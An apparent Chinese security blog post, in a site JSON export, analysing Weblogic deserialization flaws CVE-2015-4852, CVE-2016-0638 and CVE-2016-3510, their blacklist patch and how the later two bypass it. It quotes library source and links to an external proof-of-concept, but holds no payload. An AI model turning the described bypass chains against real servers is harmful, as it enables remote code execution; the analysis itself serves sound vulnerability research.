class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">Class cl = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((cl = resolveClass(readDesc)) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">   resolveEx = <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;null class&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br><span class=\"line\">desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class=\"keyword\">false</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">return</span> desc;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>结合流程图与代码来看，readNonProxyDesc方法中主要做了如下这些事情</p>\n<p>1、通过readClassDescriptor()方法从流量中获取序列化类的ObjectStreamClass并赋值给readDesc变量</p>\n<p>2、将readDesc传入resolveClass，获取该类的Class对象并赋值给cl变量</p>\n<p>3、将该类的ObjectStreamClass与Class对象传入initNonProxy方法，初始化一个ObjectStreamClass并赋值给desc变量</p>\n<p>4、将desc变量返回</p>\n<p>readNonProxyDesc方法中返回的ObjectStreamClass类型的desc变量，将会传递给readClassDesc，进而被readClassDesc传递给readOrdinaryObject</p>\n<p>readOrdinaryObject、readClassDesc与readNonProxyDesc的调用关系如下：</p>\n<p>readOrdinaryObject中调用readClassDesc:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Object <span class=\"title\">readOrdinaryObject</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n\n\n<p>readClassDesc中调用readNonProxyDesc:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readClassDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">byte</span> tc = bin.peekByte();</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (tc) &#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_CLASSDESC:</span><br><span class=\"line\">   <span class=\"keyword\">return</span> readNonProxyDesc(unshared);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>因此，当readNonProxyDesc中ObjectStreamClass类型的desc变量返回后，途径readClassDesc方法的最终传递给readOrdinaryObject中的desc变量</p>\n<p>接下来看看readOrdinaryObject方法中部分片段</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">...</span><br><span class=\"line\">    obj = desc.isInstantiable() ? desc.newInstance() : <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">if</span> (desc.isExternalizable()) &#123;</span><br><span class=\"line\">    readExternalData((Externalizable) obj, desc);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    readSerialData(obj, desc);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">handles.finish(passHandle);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (obj != <span class=\"keyword\">null</span> &amp;&amp; </span><br><span class=\"line\">    handles.lookupException(passHandle) == <span class=\"keyword\">null</span> &amp;&amp;</span><br><span class=\"line\">    desc.hasReadResolveMethod())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Object rep = desc.invokeReadResolve(obj);</span><br></pre></td></tr></table></figure>\n\n<p>上述代码中的第一行：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br></pre></td></tr></table></figure>\n\n<p>代码中由readClassDesc(false)执行得到的desc，即是readNonProxyDesc中获取并返回的ObjectStreamClass类型的desc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj = desc.isInstantiable() ? desc.newInstance() : <span class=\"keyword\">null</span>;</span><br></pre></td></tr></table></figure>\n\n<p>代码中接下来的条件分支，即是在获取了ObjectStreamClass类型的desc后，readOrdinaryObject接着尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>\n<p>关于readObject、readResolve、readExternal等方法的调用，将其整理成流程图，有助于对其更好的理解，流程图如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155537-cca7961c-1829-1.png\" alt=\"54e51374e255a9c4b137acc1d0cbd56c.png\"></p>\n<p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>\n<p>在这里提前透露下，CVE-2015-4852、CVE-2016-0638、CVE-2016-3510这三个漏洞，所利用的恰好依次是恶意类”sun.reflect.annotation.AnnotationInvocationHandler”中的readObject、”weblogic.jms.common.StreamMessageImpl”中的readExternal、以及”weblogic.corba.utils.MarshalledObject”中的readResolve方法</p>\n<p>试想一下这个场景：在没有任何防护或防护不当的时候，攻击者通过流量中传入恶意类的序列化数据，weblogic将流量中的序列化数据还原为其对应的Class对象，并尝试执行恶意类中的readObject、readResolve、readExternal等方法。这就是CVE-2015-4852、CVE-2016-0638、CVE-2016-3510漏洞的核心。</p>\n<h2 id=\"CVE-2015-4852\"><a href=\"#CVE-2015-4852\" class=\"headerlink\" title=\"CVE-2015-4852\"></a>CVE-2015-4852</h2><p>在分析过流程之后，这个漏洞呼之欲出。简单来说，在CVE-2015-4852漏洞爆发之前，weblogic对流量中的序列化数据没有任何的校验，长驱直入的恶意数据最终被还原出其Class对象，并被Weblogic调用了其Class对象中的readObject方法，结合CVE-2015-4852细节来说就是：</p>\n<ol>\n<li><p>精心构造的ChainedTransformer恶意链（以下简称恶意数据）</p>\n</li>\n<li><p>将构造好的恶意数据包裹在AnnotationInvocationHandler类的memberValues变量中</p>\n</li>\n<li><p>在流量中构造并传入上述制作好的AnnotationInvocationHandler类的序列化数据</p>\n</li>\n<li><p>Weblogic获取AnnotationInvocationHandler类的Class对象</p>\n</li>\n<li><p>Weblogic尝试调用AnnotationInvocationHandler类的readObject方法</p>\n</li>\n<li><p>AnnotationInvocationHandler类中readObject中存在一些有助于漏洞利用的操作（AnnotationInvocationHandler的readObject方法中对其memberValues的每一项调用了setValue方法进而调用了checkSetValue）</p>\n</li>\n<li><p>恶意数据存放在memberValues中伺机而动。恶意数据的原理我们就不细说了，简单来说就是，当恶意数据的checkSetValue被触发，就能造成命令执行</p>\n</li>\n<li><p>等到readObject方法对memberValues的每一项调用setValue方法执行时，setValue方法会进而调用并触发恶意数据的checkSetValue，造成命令执行</p>\n</li>\n</ol>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155550-d4cf730a-1829-1.png\" alt=\"e92fbde69bafb5ac777da44e96bd9d9a.png\"></p>\n<h2 id=\"Weblogic的防护机制\"><a href=\"#Weblogic的防护机制\" class=\"headerlink\" title=\"Weblogic的防护机制\"></a>Weblogic的防护机制</h2><p>CVE-2015-4852这个漏洞利用出现之后，官方对Weblogic进行了一些改造，增加了一些安全防护。至于怎么防护，说起来很简单，以普通类为例，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155559-da0eb3b2-1829-1.png\" alt=\"10b6817babd9d985caefe76cc0623ac0.png\"></p>\n<p>resolveClass方法的作用是从类序列化描述符获取类的Class对象，在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有，更何况要执行恶意类中的<br>readObject、readResolve、readExternal呢。</p>\n<p>我们看一下具体是怎么实现的，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155626-e9e7005a-1829-1.png\" alt=\"b95c0a9e24b511213e076e61a069e12f.png\"></p>\n<p>可见更新之后多出了一个if条件分支，通过isBlackListed校验传入的类名用来处理代理类的resolveProxyClass也是一样的方式，不再复述。</p>\n<p>从整体上来看，检查模块主要在下图红框里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155635-ef801b3c-1829-1.png\" alt=\"898634e47e18bace15c0cbba196c9b31.png\"></p>\n<p>在修复过后，CVE-2015-4852已经不能成功利用了：CVE-2015-4852所使用到的AnnotationInvocationHandler在黑名单中，会直接报错而不能获取其Class对象，更不能执行其中的readObject。</p>\n<h2 id=\"CVE-2016-0638\"><a href=\"#CVE-2016-0638\" class=\"headerlink\" title=\"CVE-2016-0638\"></a>CVE-2016-0638</h2><p>这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl”</p>\n<p>简单来说，由于黑名单的限制，CVE-2015-4852利用链没法直接使用，这个漏洞像是整了个套娃，给CVE-2015-4852装进去了。</p>\n<p>为什么使用StreamMessageImpl这个类呢？其实原理也很简单。StreamMessageImpl类中的readExternal方法可以接收序列化数据作为参数，而当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并执行该参数反序列化后对应类的readObject方法。我们动态调试一下，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155645-f52e107a-1829-1.png\" alt=\"362088fdc6055340600570c83c08993f.png\"></p>\n<p>如果我们把序列化后的CVE-2015-4852利用链序列化之后丢进readExternal呢？</p>\n<p>当我们给上图StreamMessageImpl类的readExternal中传入序列化后的CVE-2015-4852利用链，在readExternal被执行时，会将CVE-2015-4852利用链数据反序列化，并在上图864行处调用其readObject方法，也就是AnnotationInvocationHandler的readObject方法</p>\n<p>好了，AnnotationInvocationHandler的readObject方法被调用了，CVE-2015-4852复活了。</p>\n<p>但是StreamMessageImpl类的readExternal要怎么被执行呢?别忘了上文分析的Weblogic反序列化流程，在获取到StreamMessageImpl类的Class对象后，程序可不止调用其readObject方法，还会尝试调用readExternal的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155655-fb5f308c-1829-1.png\" alt=\"9ce6bbce5fae485feaa76654ff515c80.png\"></p>\n<h2 id=\"CVE-2016-3510\"><a href=\"#CVE-2016-3510\" class=\"headerlink\" title=\"CVE-2016-3510\"></a>CVE-2016-3510</h2><p>这个漏洞与上一个几乎一致，也是做了个套娃给CVE-2015-4852利用链装进去了，从而绕过了黑名单限制。</p>\n<p>这次找到的是weblogic.corba.utils.MarshalledObject</p>\n<p>首先看一下这个类的构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MarshalledObject</span><span class=\"params\">(Object var1)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (var1 == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.hash = <span class=\"number\">13</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ByteArrayOutputStream var2 = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        MarshalledObject.MarshalledObjectOutputStream var3 = <span class=\"keyword\">new</span> MarshalledObject.MarshalledObjectOutputStream(var2);</span><br><span class=\"line\">        var3.writeObject(var1);</span><br><span class=\"line\">        var3.flush();</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.objBytes = var2.toByteArray();</span><br><span class=\"line\">        <span class=\"keyword\">int</span> var4 = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> var5 = <span class=\"number\">0</span>; var5 &lt; <span class=\"keyword\">this</span>.objBytes.length; ++var5) &#123;</span><br><span class=\"line\">            var4 = <span class=\"number\">31</span> * var4 + <span class=\"keyword\">this</span>.objBytes[var5];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.hash = var4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现，这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes</p>\n<p>我们接下来看看MarshalledObject的readResolve方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">readResolve</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException, ObjectStreamException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.objBytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ByteArrayInputStream var1 = <span class=\"keyword\">new</span> ByteArrayInputStream(<span class=\"keyword\">this</span>.objBytes);</span><br><span class=\"line\">        ObjectInputStream var2 = <span class=\"keyword\">new</span> ObjectInputStream(var1);</span><br><span class=\"line\">        Object var3 = var2.readObject();</span><br><span class=\"line\">        var2.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> var3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155707-028637ca-182a-1.png\" alt=\"d47f1dff5b0fa0d58f49133ceba48d38.png\"></p>\n<p>这样以来，将CVE-2015-4852利用链传入MarshalledObject构造方法中，将MarshalledObject序列化后，则可以将CVE-2015-4852利用链保存在其this.objBytes变量中。当weblogic将构造好的MarshalledObject反序列化时，weblogic将尝试调用MarshalledObject的readResolve方法时，CVE-2015-4852利用链被执行</p>\n<p>如果对如何构造的poc细节不是很清楚，可以参照这个链接</p>\n<p><a href=\"https://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java\">https://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java</a></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>Weblogic的前三个反序列化漏洞并不复杂，但是对其的研究和分析是有一定的方式的，仅仅从单一的漏洞分析入手，很容易看不懂，反而把漏洞弄得复杂化。在了解了漏洞流程之后，再回头来看，这几个漏洞的原理便呼之欲出。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>目前。网上关于CVE-2015-4852漏洞的资料很多，但是针对CVE-2015-4852漏洞如何修复，修复补丁又是如何生效的却少之又少；而CVE-2016-0638、CVE-2016-3510这两个漏洞又是如何绕过CVE-2015-4852补丁的，则只是在介绍Weblogic系列漏洞时被一句话带过。</p>\n<p>CVE-2015-4852、CVE-2016-0638以及CVE-2016-3510，这三个漏洞有着极其相似的地方，其本质就是利用了Weblogic反序列化机制，而官方在修复CVE-2015-4852时，也并未对这个机制进行调整，而仅仅是在此基础上增加了一个关卡：黑名单。</p>\n<p>因此，在彻底搞清楚Weblogic反序列化漏洞的原理以及如何修复这个问题之前，很有必要弄清楚Weblogic处理流量中的java反序列化数据的流程。只有清楚了这一点，才能很好的理解如下几个问题：</p>\n<ol>\n<li><p>CVE-2015-4852是如何产生的以及后续是如何修复的？</p>\n</li>\n<li><p>修复CVE-2015-4852，为何要在resolveClass:108,InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)处添加黑名单？</p>\n</li>\n<li><p>CVE-2016-0638、CVE-2016-3510是如何绕过修复？二者的绕过方式有何相同与不同？</p>\n</li>\n</ol>\n<h2 id=\"Weblogic-反序列化攻击时序\"><a href=\"#Weblogic-反序列化攻击时序\" class=\"headerlink\" title=\"Weblogic 反序列化攻击时序\"></a>Weblogic 反序列化攻击时序</h2><p>为了搞清楚CVE-2015-4852、CVE-2016-0638、CVE-2016-3510中的种种疑团，我们需要首先来弄明白一些原理性的东西，我们先从Weblogic<br>反序列化攻击时序入手，看看Weblogic是如何从流量中将序列化字节码进行反序列化。</p>\n<p>首先贴出一张Weblogic 反序列化攻击时序图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155439-aa3a40c0-1829-1.png\" alt=\"f165b1f00063791e06a1dbd615604c52.png\"></p>\n<p>这张图是从我的好朋友廖新喜大佬博客扒下来的，也欢迎大家去读一读他的关于java漏洞的分析文章：</p>\n<p><a href=\"http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/\">http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/</a></p>\n<p>上图为一张完整的Weblogic反序列化攻击时序图，庞大而且繁杂，不如我们将其拆分开，首先说说Weblogic如何从流量数据取出序列化数据并获取其类对象的过程。</p>\n<h2 id=\"从流量数据到Class对象\"><a href=\"#从流量数据到Class对象\" class=\"headerlink\" title=\"从流量数据到Class对象\"></a>从流量数据到Class对象</h2><p>首先我们来看一张图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155452-b1e5a580-1829-1.png\" alt=\"ccd71bc1337e47616a30ed30beaa656c.png\"></p>\n<p>Weblogic通过7001端口，获取到流量中T3协议的java反序列化数据。从上图中readObject开始，经过流程中的一步步的加工，并最终于上图流程终点处的resolveProxyClass或resolveClass处将流量中的代理类/类类型的字节流转变为了对应的Class对象。</p>\n<p>首先我们可以发现：在ObjectInputStream (java.io)中的readClassDesc方法处，存在着分叉点，导致了序列化流量流向了两个不同的分支：其中一些流量流向了readProxyDesc并最终采用resolveProxyClass获取类对象，而另一些则流向了readNonProxyDesc并最终使用resolveClass获取类对象。</p>\n<h3 id=\"readClassDesc是什么？\"><a href=\"#readClassDesc是什么？\" class=\"headerlink\" title=\"readClassDesc是什么？\"></a>readClassDesc是什么？</h3><p>从上文来看，流量数据经过readClassDesc并驶入了不同的处理分支。</p>\n<p>首先来看一下readClassDesc方法的官方注释：“readClassDesc方法读入并返回（可能为null）类描述符。将passHandle设置为类描述符的已分配句柄。”</p>\n<p>如果想理解官方注释的含义，需要扩充一些java序列化的知识：</p>\n<p>java序列化数据在流量传输，并不是随随便便杂乱无章的，序列化数据的格式是要遵循序列化流协议。</p>\n<p>序列化流协议定义了字节流中传输的对象的基本结构。该协议定义了对象的每个属性：其类，其字段以及写入的数据，以及以后由类特定的方法读取的数据。</p>\n<p>字节流中对象的表示可以用一定的语法格式来描述。对于空对象，新对象，类，数组，字符串和对流中已有对象的反向引用，都有特殊的表示形式。比如说在字节流中传递的序列化数据中，字符串有字符串类型的特定格式、对象有对象类型的特定格式、类结构有着类结构。而TC_STRING、TC_OBJECT、TC_CLASSDESC则是他们的描述符，他们标识了接下来这段字节流中的数据是什么类型格式的</p>\n<p>以TC_CLASSDESC为例，TC_CLASSDESC在流量中的值是(byte)0x72，在序列化流协议中，当这个值出现后，代表接下来的数据将开始一段Class的描述(DESC=description)，即TC_CLASSDESC描述符(byte)0x72后面的字节流数据为Class类型。通过这些描述符，程序可以正确的解析流量中的序列化数据。</p>\n<p>如果对这部分感兴趣，可以参照oracle文档：</p>\n<p><a href=\"https://www.oracle.com/security-alerts/cpuoct2020traditional.html\">https://www.oracle.com/security-alerts/cpuoct2020traditional.html</a></p>\n<p>readClassDesc的功能很简单：读入字节流，通过读取字节流中的描述符来确定字节流中传递数据的类型，并交给对应的方法进行处理。</p>\n<p>接下来我们看看readClassDesc的实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readClassDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">byte</span> tc = bin.peekByte();</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (tc) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_NULL:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (ObjectStreamClass) readNull();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_REFERENCE:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (ObjectStreamClass) readHandle(unshared);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_PROXYCLASSDESC:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> readProxyDesc(unshared);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_CLASSDESC:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> readNonProxyDesc(unshared);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> StreamCorruptedException(</span><br><span class=\"line\">\t    String.format(<span class=\"string\">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>从readClassDesc方法的实现可见，readClassDesc中switch语句有5个分支（TC_NULL、TC_REFERENCE、TC_PROXYCLASSDESC、TC_CLASSDESC、default）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TC_NULL描述符表示空对象引用</span><br><span class=\"line\"></span><br><span class=\"line\">TC_REFERENCE描述符表示引用已写入流的对象</span><br><span class=\"line\"></span><br><span class=\"line\">TC_PROXYCLASSDESC是新的代理类描述符</span><br><span class=\"line\"></span><br><span class=\"line\">TC_CLASSDESC是新的类描述符</span><br></pre></td></tr></table></figure>\n\n<p>那么我们为什么在上文流程图里只画出了其中两处分支（TC_PROXYCLASSDESC、TC_CLASSDESC）呢？</p>\n<p>我们先来看看Weblogic反序列化漏洞成的原理：Weblogic反序列化漏洞是由于通过流量中传入的恶意类而未得到合理的过滤，最终被反序列化而形成。</p>\n<p>从原理上来看，是weblogic对流量中序列化后的类对象处理时出现的问题。</p>\n<p>基于这一点，我们应重点关注程序是如何从流量中获取并处理类类型数据的流程。</p>\n<p>TC_PROXYCLASSDESC与TC_CLASSDESC描述符标识了流量中代理类与类这两种类型的数据，因此我们重点关注TC_PROXYCLASSDESC与TC_CLASSDESC这两处分支，这也是上文流程图里只有这两处分支的原因。</p>\n<p>当readClassDesc从字节流中读取到TC_CLASSDESC描述符，说明此处程序此时要处理的字节流为普通类，程序接下来会调用readNonProxyDesc方法对这段字节流进行解析。</p>\n<p>在readNonProxyDesc方法中，程序会从该段序列化流中获取类的序列化描述符ObjectStreamClass（类序列化描述符ObjectStreamClass，其本质是对Class类的包装，可以想象成一个字典，里面记录了类序列化时的一些信息，包括字段的描述信息和serialVersionUID 和需要序列化的字段fields，以便在反序列化时拿出来使用）。随后该类的序列化描述符被传递给resolveClass方法，resolveClass方法从该类的序列化描述符中获取对应的Class对象。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155508-bbe2ab14-1829-1.png\" alt=\"6f8788495652b7967dbc4b94b7452790.png\"></p>\n<p>当readClassDesc从字节流中读取到TC_PROXYCLASSDESC描述符时，说明此处程序此时要处理的字节流为动态代理类，程序接下来会调用readProxyDesc方法进行处理，过程与上文一致，不再复述。</p>\n<p>我们以此处传入的字节流为普通类为例，接下来看看resolveClass是如何将类的序列化描述符加工成该类的Class对象</p>\n<p>位于weblogic/rjvm/InboundMsgAbbrev.class中的resolveClass方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 